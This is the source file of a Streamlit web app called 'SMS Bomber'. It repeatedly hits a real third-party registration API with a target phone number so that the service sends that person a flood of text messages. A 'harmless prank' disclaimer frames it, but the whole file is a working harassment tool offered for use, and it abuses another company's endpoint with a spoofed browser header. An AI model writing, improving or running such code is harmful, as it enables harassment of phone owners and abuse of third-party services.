import streamlit as st
import urllib.request, urllib.error
import time
from datetime import datetime

st.set_page_config(
    page_title= "SMS Bomber",
    page_icon="icon.png",
    menu_items={
        "About": "SMS Bomber is a free prank tool designed to send a massive volume of text messages to a target number in a short time. Perfect for surprising friends or playing harmless pranks."
    }
)

url = "https://securedapi.confirmtkt.com/api/platform/register?mobileNumber="
headers = {
    "User-Agent":
        ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 "
         "(KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"),
    "Accept":
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.8",
    "Connection": "keep-alive",
}

countries = [
    ("+91", "India"),
    ("+1", "United States"),
    ("+44", "United Kingdom"),
    ("+81", "Japan"),
    ("+61", "Australia"),
    ("+49", "Germany"),
    ("+33", "France"),
    ("+86", "China"),
    ("+39", "Italy"),
    ("+971", "United Arab Emirates"),
    ("+92", "Pakistan"),
    ("+880", "Bangladesh"),
    ("+234", "Nigeria"),
    ("+55", "Brazil"),
    ("+7", "Russia"),
    ("+93", "Afghanistan"),
    ("+355", "Albania"),
    ("+213", "Algeria"),
    ("+376", "Andorra"),
    ("+244", "Angola"),
    ("+1-264", "Anguilla"),
    ("+1-268", "Antigua and Barbuda"),
    ("+54", "Argentina"),
    ("+374", "Armenia"),
    ("+297", "Aruba"),
    ("+43", "Austria"),
    ("+994", "Azerbaijan"),
    ("+1-242", "Bahamas"),
    ("+973", "Bahrain"),
    ("+975", "Bhutan"),
    ("+591", "Bolivia"),
    ("+387", "Bosnia and Herzegovina"),
    ("+267", "Botswana"),
    ("+55", "Brazil"),
    ("+673", "Brunei Darussalam"),
    ("+359", "Bulgaria"),
    ("+226", "Burkina Faso"),
    ("+257", "Burundi"),
    ("+238", "Cabo Verde"),
    ("+855", "Cambodia"),
    ("+237", "Cameroon"),
    ("+1", "Canada"),
    ("+236", "Central African Republic"),
    ("+235", "Chad"),
    ("+56", "Chile"),
    ("+57", "Colombia"),
    ("+269", "Comoros"),
    ("+242", "Congo (Congo-Brazzaville)"),
    ("+506", "Costa Rica"),
    ("+385", "Croatia"),
    ("+53", "Cuba"),
    ("+357", "Cyprus"),
    ("+420", "Czech Republic"),
    ("+45", "Denmark"),
    ("+253", "Djibouti"),
    ("+1-767", "Dominica"),
    ("+1-809", "Dominican Republic"),
    ("+593", "Ecuador"),
    ("+20", "Egypt"),
    ("+503", "El Salvador"),
    ("+240", "Equatorial Guinea"),
    ("+291", "Eritrea"),
    ("+372", "Estonia"),
    ("+251", "Ethiopia"),
    ("+679", "Fiji"),
    ("+358", "Finland"),
    ("+41", "Switzerland"),
    ("+963", "Syria"),
    ("+886", "Taiwan"),
    ("+992", "Tajikistan"),
    ("+255", "Tanzania"),
    ("+66", "Thailand"),
    ("+228", "Togo"),
    ("+676", "Tonga"),
    ("+1-868", "Trinidad and Tobago"),
    ("+216", "Tunisia"),
    ("+90", "Turkey"),
    ("+993", "Turkmenistan"),
    ("+688", "Tuvalu"),
    ("+256", "Uganda"),
    ("+380", "Ukraine"),
    ("+598", "Uruguay"),
    ("+998", "Uzbekistan"),
    ("+678", "Vanuatu"),
    ("+58", "Venezuela"),
    ("+84", "Vietnam"),
    ("+967", "Yemen"),
    ("+260", "Zambia"),
    ("+263", "Zimbabwe")
]

st.write(f"<h2 style='color:#FFC107;'>Ultimate SMS Bomber {datetime.now().year}</h2>",unsafe_allow_html=True)

st.info("We created this website for entertainment purposes only. We don't have any intentions to harm anyone. Please use responsibly.")

country_options = [f"{code} {name}" for code, name in countries]
countryCode = st.selectbox("Select country code",country_options)
target = st.text_input("Enter your phone number",placeholder="9999999999")

if target:
    if not target.isdigit():
        st.error("Phone number must contain digit only.")
    elif len(target) != 10:
        st.error("Phone number must be exactly 10 digits long.")

totalMessage = st.number_input("Number of messages",max_value=50,min_value=1)
delay = st.number_input("Delay between messages",min_value=1)

btn = st.button("Start Bombing 💣")
status_placeholder = st.empty()

if btn:
    code = countryCode.split(" ")[0]
    combinedNumber = code+target
    req = urllib.request.Request(url + combinedNumber, headers=headers)

    for i in range(1, totalMessage + 1):
        status_placeholder.info(f"Sending message {i}/{totalMessage}...")

        # Do the actual work
        try:
            with urllib.request.urlopen(req, timeout=10) as resp:
                resp.read()
        except urllib.error.URLError as e:
            st.error(f"Request failed ✗: {e.reason}")
        except Exception as e:
            st.error(f"Unexpected error: {e}")

        # Delay
        time.sleep(delay)

    status_placeholder.empty()
    st.success("All messages sent ✓")